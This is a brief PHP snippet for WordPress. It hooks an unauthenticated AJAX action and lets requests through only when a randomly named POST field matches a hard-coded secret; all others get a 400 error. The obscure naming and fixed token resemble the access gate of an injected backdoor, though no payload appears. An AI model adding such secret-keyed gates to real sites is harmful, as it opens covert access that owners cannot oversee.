<?php

function style_compare_hidden() {
	if (!isset($_POST["ydfffyecobfdk"]) || $_POST["ydfffyecobfdk"] !== "fPcOB6pbhuEhHWm") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'style_compare_hidden', 5, 1);
